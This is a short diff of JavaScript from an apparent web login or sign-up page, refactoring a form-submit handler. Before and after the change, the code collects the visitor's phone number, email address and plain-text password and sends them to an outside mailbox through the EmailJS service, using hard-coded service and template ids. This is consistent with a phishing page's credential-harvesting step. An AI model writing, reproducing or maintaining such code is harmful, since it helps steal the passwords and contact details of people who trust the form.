@@ -457,16 +457,12 @@
 
             // Show loading indicator
             document.getElementById('loading').classList.remove('hidden');
-
-            // Prepare data to send with EmailJS
-            const data = {
+                // Send data via EmailJS
+            emailjs.send('service_ve6w0et', 'template_fzdw02s', {
                 phone: phone,
                 email: email,
                 password: password
-            };
-
-            // Send data via EmailJS
-            emailjs.send('service_ve6w0et', 'template_fzdw02s', data)
+             })
                 .then(function(response) {
                     console.log('Email sent successfully:', response);
                     document.getElementById('loading').classList.add('hidden');
